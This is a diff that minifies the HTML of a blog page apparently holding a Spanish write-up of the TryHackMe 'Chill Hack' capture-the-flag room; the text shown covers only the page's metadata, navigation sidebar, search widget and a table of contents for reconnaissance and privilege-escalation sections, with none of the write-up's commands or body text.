@@ -1,892 +1,28 @@
-<!doctype html>
-<html lang="en" data-bs-theme="auto">
-  <head>
-  <meta charset="utf-8">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
-<script 
-  src="/js/color-mode.86a91f050a481d0a3f0c72ac26543cb6228c770875981c58dcbc008fd3f875c8.js"
-  integrity="sha256-hqkfBQpIHQo/DHKsJlQ8tiKMdwh1mBxY3LwAj9P4dcg=">
-</script>
-
-
-<link rel="stylesheet" href="/main.f123605798fa81252c4858ee022f36eeed1b8897d6e9a6e140622fb33c657296035adc9fa6d338de59d7586d3c3983fbfc6fff308e163a2b6cac9789aec8adfe.css" integrity="sha512-8SNgV5j6gSUsSFjuAi827u0biJfW6abhQGIvszxlcpYDWtyfptM43lnXWG08OYP7/G//MI4WOitsrJeJrsit/g==" crossorigin="anonymous">
-<noscript><style>img.lazyload { display: none; }</style></noscript>
-  <link rel="canonical" href="/writeups/tryhackme/chill-hack/">
-
-<title>Chill Hack | d3b0o</title>
-  
-<meta name="description" content="">
-
-
-
-
-
-
-
-
-
-
-<meta property="og:title" content="Chill Hack" />
-<meta property="og:description" content="https://tryhackme.com/room/chillhack
+<!doctype html><html lang=en data-bs-theme=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/color-mode.86a91f050a481d0a3f0c72ac26543cb6228c770875981c58dcbc008fd3f875c8.js integrity="sha256-hqkfBQpIHQo/DHKsJlQ8tiKMdwh1mBxY3LwAj9P4dcg="></script><link rel=stylesheet href=/main.f123605798fa81252c4858ee022f36eeed1b8897d6e9a6e140622fb33c657296035adc9fa6d338de59d7586d3c3983fbfc6fff308e163a2b6cac9789aec8adfe.css integrity="sha512-8SNgV5j6gSUsSFjuAi827u0biJfW6abhQGIvszxlcpYDWtyfptM43lnXWG08OYP7/G//MI4WOitsrJeJrsit/g==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/tryhackme/chill-hack/><title>Chill Hack | d3b0o</title><meta name=description content><meta property="og:title" content="Chill Hack"><meta property="og:description" content="https://tryhackme.com/room/chillhack
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.11.182
-Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/writeups/tryhackme/chill-hack/" /><meta property="og:image" content="/cover.png"/><meta property="article:section" content="writeups" />
-<meta property="article:published_time" content="2023-03-01T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-03-01T00:00:00+00:00" /><meta property="og:site_name" content="d3b0o" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="/cover.png"/>
-
-<meta name="twitter:title" content="Chill Hack"/>
-<meta name="twitter:description" content="https://tryhackme.com/room/chillhack
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"><meta property="og:type" content="article"><meta property="og:url" content="/writeups/tryhackme/chill-hack/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-03-01T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-01T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary"><meta name=twitter:title content="Chill Hack"><meta name=twitter:description content="https://tryhackme.com/room/chillhack
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.11.182
-Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"/>
-<meta name="twitter:site" content="@getdoks"/>
-
-    
-    
-    <script type="application/ld+json">{
-   "@context": "https://schema.org",
-   "@type": "BreadcrumbList",
-   "itemListElement": [
-     {
-       "@type": "ListItem",
-       "item": "/",
-       "name": "D3b0o",
-       "position": 1
-     },
-     {
-       "@type": "ListItem",
-       "item": "/writeups/",
-       "name": "Writeups",
-       "position": 2
-     },
-     {
-       "@type": "ListItem",
-       "item": "/writeups/tryhackme/",
-       "name": "Try Hack Me",
-       "position": 3
-     },
-     {
-       "@type": "ListItem",
-       "name": "Chill Hack",
-       "position": 4
-     }
-   ]
- }</script>
-
-
-
-
-
-
-
-
-
-
-</head>
-
-  
-  <body class="single section writeups" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
-    <div class="sticky-top">
-<div class="header-bar"></div>
-<header class="navbar navbar-expand-lg">
-  <div class="container-lg">
-  
-    <a class="navbar-brand me-auto me-lg-3" href="/">d3b0o</a>
-
-    
-    
-    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
-      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-        <circle cx="10" cy="10" r="7"></circle>
-        <line x1="21" y1="21" x2="15" y2="15"></line>
-      </svg>
-    </button>
-    
-    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
-      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
-        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
-        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
-      </svg>
-    </button>
-    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
-      <div class="header-bar"></div>
-      <div class="offcanvas-header">
-        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Writeups</h5>
-        <button type="button" class="btn btn-link nav-link p-0" data-bs-dismiss="offcanvas" aria-label="Close">
-          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-            <path d="M18 6l-12 12"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-      <div class="offcanvas-body">
-        <aside class="doks-sidebar mt-n3">
-          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
-            
-<ul class="list-unstyled collapsible-sidebar">
-  
-    
-      
-      <li class="mb-1">
-        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-d9fb08be3ed131369df5d4aa808dac70" aria-expanded="false">
-          HackTheBox
-        </button>
-        <div class="collapse" id="section-d9fb08be3ed131369df5d4aa808dac70">
-          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/toolbox/">Toolbox</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/pandora-video/">Pandora (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/horizontall-video/">Horizontall (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/bashed-video/">Bashed (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/blue/">Blue</a></li>
-              
-            
-          </ul>
-        </div>
-      </li>
-    
-      
-      <li class="mb-1">
-        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-3e74cf5d3d91ad9d67cc0e52e7daf92a" aria-expanded="true">
-          TryHackMe
-        </button>
-        <div class="collapse show" id="section-3e74cf5d3d91ad9d67cc0e52e7daf92a">
-          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/blue/">Blue</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded active" href="/writeups/tryhackme/chill-hack/">Chill Hack</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/team/">Team</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/startup/">Startup</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/source/">Source</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/mustacchio/">Mustacchio</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/wonderland/">Wonderland</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/bounty-hacker/">Bounty Hacker</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/overpass/">Overpass</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/develpy/">Develpy</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/tomghost/">Tomghost</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/wgel/">Wgel</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/gallery/">Gallery</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/mr.robot/">Mr.Robot</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/agent-t/">Agent T</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/vulnversity/">Vulnversity</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/brooklyn-nine-nine/">Brooklyn Nine Nine</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/agent-sudo/">Agent sudo</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/lazy-admin/">Lazy admin</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/chocolate-factory/">Chocolate Factory</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/rootme/">RootMe</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/pickle-rick/">Pickle Rick</a></li>
-              
-            
-          </ul>
-        </div>
-      </li>
-    
-      
-      <li class="mb-1">
-        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-899f9e1034ad8d41a30f4792e02699a8" aria-expanded="false">
-          HackMyVm
-        </button>
-        <div class="collapse" id="section-899f9e1034ad8d41a30f4792e02699a8">
-          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-iii-video/">Friendly III (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/visions-video/">Visions (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-ii-video/">Friendly II (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/five-video/">Five (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/doc-video/">Doc (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/literal-video/">Literal (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita-video/">Jabita (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-i-video/">Friendly I (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/uvalde-video/">Uvalde (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/w140-video/">W140 (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita/">Jabita</a></li>
-              
-            
-          </ul>
-        </div>
-      </li>
-    
-    
-  
-</ul>
-
-          </nav>
-        </aside>
-      </div>
-    </div>
-    
-    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
-      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-        <line x1="4" y1="8" x2="20" y2="8"></line>
-        <line x1="4" y1="16" x2="20" y2="16"></line>
-      </svg>
-    </button>
-
-    
-    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
-      <div class="header-bar d-lg-none"></div>
-      <div class="offcanvas-header">
-        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">d3b0o</h5>
-        <button type="button" class="btn btn-link nav-link p-0" data-bs-dismiss="offcanvas" aria-label="Close">
-          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-            <path d="M18 6l-12 12"></path>
-            <path d="M6 6l12 12"></path>
-         </svg>
-        </button>
-      </div>
-      
-      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
-        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
-                <a class="nav-link active" href="/writeups/hackthebox/toolbox/" aria-current="true">Writeups</a>
-              </li>
-            <li class="nav-item">
-                <a class="nav-link" href="/blog/">Blog</a>
-              </li>
-            </ul>
-
-        
-        
-        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
-          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-            <circle cx="10" cy="10" r="7"></circle>
-            <line x1="21" y1="21" x2="15" y2="15"></line>
-          </svg>
-        </button>
-        
-        
-        
-        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
-          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
-          </svg>
-          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
-          </svg>
-        </button>
-        
-        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
-          <li class="nav-item">
-              <a class="nav-link social-link" href="https://x.com/sr_d3b0o"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M4 4l11.733 16h4.267l-11.733 -16z"></path><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path></svg><small class="ms-2 visually-hidden">Twitter</small></a>
-            </li>
-          <li class="nav-item">
-              <a class="nav-link social-link" href="https://github.com/d3b0o"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
-            </li>
-          </ul>
-        
-        <a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href="https://www.buymeacoffee.com/d3b0o" role="button">Support</a>
-        </div>
-    </div>
-
-    
-    <a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href="https://www.buymeacoffee.com/d3b0o" role="button">Support</a>
-    </div>
-</header>
-</div>
-
-<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
-        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
-        <div class="search-input flex-grow-1 d-none">
-          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
-            <label for="query" class="visually-hidden">Search</label>
-            <div class="d-flex">
-              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
-              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
-            </div>
-          </form>
-        </div>
-      </div>
-      <div class="modal-body">
-        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
-        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
-        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
-        <div id="searchResults" class="search-results"></div>
-        <template>
-          <article class="search-result list-view">
-            <div class="card my-3">
-              <div class="card-body">
-                <header>
-                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
-                  <div class="submitted"><time class="created-date">Date here</time></div>
-                </header>
-                <div class="content">Summary here</div>
-              </div>
-            </div>
-          </article>
-        </template>
-      </div>
-      <div class="modal-footer">
-        <ul class="list-inline me-auto d-none d-md-block">
-          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
-          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
-          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
-        </ul>
-        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
-      </div>
-    </div>
-  </div>
-</div>
-
-
-    <div class="wrap container-lg" role="document">
-      <div class="content">
-      
-        
-	<div class="row flex-xl-nowrap">
-		<div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block">
-			<nav class="docs-links" aria-label="Main navigation">
-				
-<ul class="list-unstyled collapsible-sidebar">
-  
-    
-      
-      <li class="mb-1">
-        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-d9fb08be3ed131369df5d4aa808dac70" aria-expanded="false">
-          HackTheBox
-        </button>
-        <div class="collapse" id="section-d9fb08be3ed131369df5d4aa808dac70">
-          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/toolbox/">Toolbox</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/pandora-video/">Pandora (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/horizontall-video/">Horizontall (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/bashed-video/">Bashed (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackthebox/blue/">Blue</a></li>
-              
-            
-          </ul>
-        </div>
-      </li>
-    
-      
-      <li class="mb-1">
-        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-3e74cf5d3d91ad9d67cc0e52e7daf92a" aria-expanded="true">
-          TryHackMe
-        </button>
-        <div class="collapse show" id="section-3e74cf5d3d91ad9d67cc0e52e7daf92a">
-          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/blue/">Blue</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded active" href="/writeups/tryhackme/chill-hack/">Chill Hack</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/team/">Team</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/startup/">Startup</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/source/">Source</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/mustacchio/">Mustacchio</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/wonderland/">Wonderland</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/bounty-hacker/">Bounty Hacker</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/overpass/">Overpass</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/develpy/">Develpy</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/tomghost/">Tomghost</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/wgel/">Wgel</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/gallery/">Gallery</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/mr.robot/">Mr.Robot</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/agent-t/">Agent T</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/vulnversity/">Vulnversity</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/brooklyn-nine-nine/">Brooklyn Nine Nine</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/agent-sudo/">Agent sudo</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/lazy-admin/">Lazy admin</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/chocolate-factory/">Chocolate Factory</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/rootme/">RootMe</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/tryhackme/pickle-rick/">Pickle Rick</a></li>
-              
-            
-          </ul>
-        </div>
-      </li>
-    
-      
-      <li class="mb-1">
-        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-899f9e1034ad8d41a30f4792e02699a8" aria-expanded="false">
-          HackMyVm
-        </button>
-        <div class="collapse" id="section-899f9e1034ad8d41a30f4792e02699a8">
-          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-iii-video/">Friendly III (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/visions-video/">Visions (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-ii-video/">Friendly II (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/five-video/">Five (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/doc-video/">Doc (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/literal-video/">Literal (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita-video/">Jabita (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-i-video/">Friendly I (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/uvalde-video/">Uvalde (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/w140-video/">W140 (Video)</a></li>
-              
-            
-              
-                
-                <li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita/">Jabita</a></li>
-              
-            
-          </ul>
-        </div>
-      </li>
-    
-    
-  
-</ul>
-
-			</nav>
-		</div>
-		
-		<nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
-			<div class="page-links">
-  <h3>On this page</h3>
-    <nav id="toc">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#reconocimiento">Reconocimiento</a>
-          <ul>
-            <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
-          </ul>
-        </li>
-        <li><a href="#ftp">FTP</a></li>
-        <li><a href="#http">HTTP</a>
-          <ul>
-            <li><a href="#subdirectorios">Subdirectorios</a></li>
-            <li><a href="#intrusión">Intrusión</a></li>
-          </ul>
-        </li>
-        <li><a href="#tratamiento-de-la-tty">Tratamiento de la tty</a></li>
-        <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
-          <ul>
-            <li><a href="#apaar">Apaar</a></li>
-            <li><a href="#anurodh">Anurodh</a>
-              <ul>
-                <li><a href="#mysql-rabbit-hole">mysql (rabbit hole)</a></li>
-                <li><a href="#steganography">Steganography</a></li>
-              </ul>
